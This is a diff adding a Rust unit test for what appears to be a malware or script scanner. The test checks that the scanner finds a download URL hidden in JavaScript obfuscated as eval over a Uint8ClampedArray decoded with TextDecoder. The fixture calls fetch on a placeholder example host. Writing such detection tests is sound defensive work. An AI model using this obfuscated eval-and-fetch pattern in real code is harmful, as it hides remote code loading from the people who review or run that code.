@@ -14095,6 +14095,32 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_textdecoder_uint8clampedarray_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://textdecoder-uint8clampedarray-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new TextDecoder().decode(new Uint8ClampedArray([{bytes}])))"#)
+            .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://textdecoder-uint8clampedarray-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS TextDecoder Uint8ClampedArray payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_textdecoder_encoding_arg_uint8array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://textdecoder-encoding-arg-js.example/p')";
